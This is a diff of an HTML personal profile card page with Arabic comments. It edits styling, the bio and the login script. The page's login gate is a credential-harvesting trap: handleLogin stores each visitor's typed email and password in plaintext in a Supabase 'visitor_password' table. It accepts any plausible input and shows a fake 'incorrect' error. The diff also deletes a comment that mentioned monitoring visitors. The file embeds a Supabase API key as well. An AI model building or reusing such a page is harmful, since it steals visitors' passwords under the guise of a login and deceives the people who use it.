@@ -9,7 +9,6 @@
     
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,700&display=swap"/>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/typed.js/2.0.10/typed.min.js"></script>
     
     <style>
         :root {
@@ -19,13 +18,12 @@
             --muted-gold: #c5a059;
             --deep-blue: #1A2980;
             --white: #e6f1ff;
-            --text-color: #8892b0;
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; text-decoration: none; }
         body { background: var(--back_color); width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
 
-        /* واجهة الدخول ورصد الزوار */
+        /* واجهة الدخول */
         #auth-screen {
             position: fixed; inset: 0; background: var(--back_color); z-index: 1000;
             display: flex; justify-content: center; align-items: center;
@@ -43,10 +41,10 @@
         .auth-box button {
             width: 100%; padding: 14px; margin-top: 20px;
             background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold));
-            border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s;
+            border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer;
         }
 
-        /* الـ vCard */
+        /* ملف الـ vCard الشخصي */
         .vcard {
             width: 90%; max-width: 420px; height: 600px; background: var(--front_color);
             backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2);
@@ -64,11 +62,18 @@
         .profile_video { width: 100%; height: 100%; object-fit: cover; }
         
         .card_content { padding-top: 85px; text-align: center; }
-        .satan h4 { font-size: 1.9em; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
-        .snuff { min-height: 80px; padding: 0 30px; color: var(--text-color); margin-top: 10px; font-size: 0.9em; line-height: 1.6; }
+        .satan h4 { font-size: 1.9em; background: linear-gradient(to right, var(--gold), var(--white)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin-bottom: 10px; }
         
-        /* الروابط */
-        .social { margin-top: 20px; }
+        /* السيرة الذاتية القديمة باللون الذهبي */
+        .old-bio { 
+            color: var(--muted-gold); 
+            font-size: 0.95em; 
+            padding: 0 30px; 
+            line-height: 1.6;
+            font-weight: 500;
+        }
+
+        .social { margin-top: 25px; }
         .social div { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; padding: 0 20px; }
         .social i { padding: 12px; font-size: 1.3em; background: rgba(197, 160, 89, 0.05); border-radius: 12px; border: 1px solid rgba(197, 160, 89, 0.1); color: var(--muted-gold); transition: 0.3s; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; }
         .social a:hover i { color: var(--gold); transform: translateY(-5px); border-color: var(--gold); }
@@ -99,20 +104,21 @@
     </div>
     <div class="card_content">
         <div class="satan"><h4>SALEM</h4></div>
-        <div class="snuff"><h5 class="typed_text"></h5></div>
+        
+        <div class="old-bio">
+            Web Designer & Creative Developer.<br>
+            Specialized in UI/UX Aesthetics.<br>
+            BELIEVE IN YOURSELF.
+        </div>
         
         <div class="social">
             <div>
                 <a href="https://t.me/kokksha"><i class="fab fa-telegram"></i></a>
                 <a href="https://www.facebook.com/share/15KQ2NmX9V/"><i class="fab fa-facebook"></i></a>
                 <a href="https://www.instagram.com/_u_vf?igsh=bXRqd2Z4ZWhteW94"><i class="fab fa-instagram"></i></a>
-                
                 <a href="https://github.com/salemalshamrie"><i class="fas fa-code"></i></a>
-                
                 <a href="https://16salm.github.io/AI/"><i class="fas fa-lightbulb"></i></a>
-                
                 <a href="https://www.fcbarcelona.com"><i class="fas fa-football-ball"></i></a>
-                
                 <a href="#"><i class="fas fa-university"></i></a>
             </div>
         </div>
@@ -123,16 +129,23 @@
 <script>
     const SB_URL = 'https://gzioimivawyqxjoxajdw.supabase.co';
     const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd6aW9pbWl2YXd5cXhqb3hhamR3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU0MTc1ODQsImV4cCI6MjA5MDk5MzU4NH0.2xKTF4oDkvUUFts6Igab01OfOPKkezAb3-U_xV7r1zY';
-
     const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
+
+    // التحقق من حالة الدخول عند التحديث
+    window.onload = () => {
+        if (localStorage.getItem('isUnlocked') === 'true') {
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('profile-card').style.display = 'block';
+        }
+    };
 
     async function handleLogin() {
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
         const errorMsg = document.getElementById('error-msg');
 
-        if (email === "" || password === "") {
-            errorMsg.innerText = "يرجى ملء كافة الحقول";
+        if (!email.includes('@') || password.length < 6) {
+            errorMsg.innerText = "خطأ في الإيميل أو الرمز غير صحيح";
             return;
         }
 
@@ -141,22 +154,12 @@
             .insert([{ visitor_email: email, visitor_password: password }]);
 
         if (error) {
-            errorMsg.innerText = "حدث خطأ فني";
+            errorMsg.innerText = "حدث خطأ في الاتصال";
         } else {
+            // حفظ الدخول لعدم المطالبة به مرة أخرى
+            localStorage.setItem('isUnlocked', 'true');
             document.getElementById('auth-screen').style.display = 'none';
             document.getElementById('profile-card').style.display = 'block';
-
-            new Typed(".typed_text", {
-                strings: [
-                    "Web Designer & Creative Developer.",
-                    "Specialized in UI/UX Aesthetics.",
-                    "BELIEVE IN YOURSELF."
-                ],
-                typeSpeed: 50,
-                backSpeed: 30,
-                loop: true,
-                showCursor: false
-            });
         }
     }
 </script>
